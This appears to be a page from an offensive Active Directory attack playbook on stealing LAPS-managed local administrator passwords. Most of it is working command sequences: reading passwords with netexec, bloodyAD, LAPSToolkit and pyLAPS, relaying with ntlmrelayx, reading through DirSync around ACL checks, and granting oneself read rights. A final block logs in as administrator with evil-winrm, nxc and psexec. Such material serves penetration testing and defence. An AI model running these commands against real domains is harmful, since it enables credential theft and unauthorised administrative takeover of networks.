---
title: "15 · LAPS Attacks"
---

# 15 · LAPS Attacks

> LAPS rotates local admin passwords, but if you can read them, they're handed to you in cleartext.

!!! note "Phase overview"
    `LAPS` (Local Administrator Password Solution) randomizes the local Administrator password on every domain-joined machine and stores it in AD. Read access is controlled by ACLs on the computer object and admins routinely over-grant. Legacy LAPS uses ms-Mcs-AdmPwd; Windows LAPS (2023+) uses msLAPS-Password and can encrypt. There's also a forgotten footgun: the account that joined a computer to the domain implicitly has AllExtendedRights on it, which includes ReadLAPSPassword.

### 15.1 · Read LAPS Password

!!! info "Why this works / how it chains"

    Every tool just queries the LDAP attribute; netexec is fastest, LAPSToolkit is the canonical PowerShell module, pyLAPS for Linux. The retrieved password is the local Administrator password and use it with --local-auth or as administrator@TARGET-PC.

!!! warning "What leads here"
    - BloodHound shows ReadLAPSPassword edge to a computer
    - AllExtendedRights on a computer object
    - GenericAll on a computer object
    - Account that JOINED the computer to the domain (mS-DS-CreatorSID)
    - Signs: BloodHound 'Find Computers where Domain Users can read LAPS passwords'

```bash title="Multiple read methods"
# Enumerate who can read LAPS
# bloodyAD
bloodyAD get search \
  --filter '(ms-mcs-admpwdexpirationtime=*)' \
  --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime

# netexec (fastest)
netexec ldap <DC_IP> -d domain.local -u user -p pass --module laps
netexec ldap <DC_IP> -d domain.local -u user -p pass --module laps \
  -O computer="TARGET-*"

# LAPSToolkit (PowerShell)
Import-Module .\LAPSToolkit.ps1
Get-LapsADPassword -Identity TARGET-PC -AsPlainText
Find-LapsADExtendedRights -Identity Workstations  # who has rights

# Windows LAPS cmdlet (if available)
Get-LapsADPassword -Identity TARGET-PC -AsPlainText
Get-LapsADPassword -Identity dc01 -AsPlainText  # DSRM password on DC!

# pyLAPS (Linux)
python3 pyLAPS.py --action get -d domain.local \
  -u user -p pass --dc-ip <DC_IP>

# impacket (relay attack)
impacket-ntlmrelayx -tf targets.txt --dump-laps

# netexec module
nxc ldap <DC_IP> -u user -p pass --module laps
```

```bash title="Use the LAPS password"
evil-winrm -i TARGET-PC -u administrator -p 'LAPSpassword'
nxc smb TARGET-PC -u administrator -p 'LAPSpassword'
impacket-psexec domain.local/administrator:'LAPSpassword'@TARGET-PC
```


### 15.2 · SyncLAPSPassword (DCSync-style for LAPS)

!!! info "Why this works / how it chains"

    `DirSync` is a replication API normally used by AD-aware apps. With the right replication rights, it can read confidential/RODC-filtered attributes, including LAPS which bypassing normal ACL checks. It generates 4662 events if SACL auditing is configured.

!!! warning "What leads here"
    - BloodHound shows SyncLAPSPassword edge
    - Account has DS-Replication-Get-Changes + DS-Replication-Get-Changes-In-Filtered-Set
    - Different from ReadLAPSPassword : uses the DirSync API

```powershell title="DirSync read"
# Uses DirSync to read confidential/RODC-filtered attributes
# DirSync PowerShell module
Import-Module .\DirSync.ps1
Sync-LAPS -LDAPFilter '(samaccountname=TargetComputer$)'

# This bypasses normal ACL checks on confidential attributes
# Generates event 4662 if SACL is configured
```


### 15.3 · Grant Yourself ReadLAPSPassword

!!! info "Why this works / how it chains"

    If you have ***`GenericAll/WriteDACL`*** on a computer or its OU, grant yourself AllExtendedRights, then read LAPS normally.

```powershell title="Self-grant + read"
# Grant yourself AllExtendedRights on a computer
Add-DomainObjectAcl \
  -TargetIdentity "CN=TARGET-PC,CN=Computers,DC=domain,DC=local" \
  -PrincipalIdentity youruser \
  -Rights All

# Now read LAPS
Get-LapsADPassword -Identity TARGET-PC -AsPlainText
```

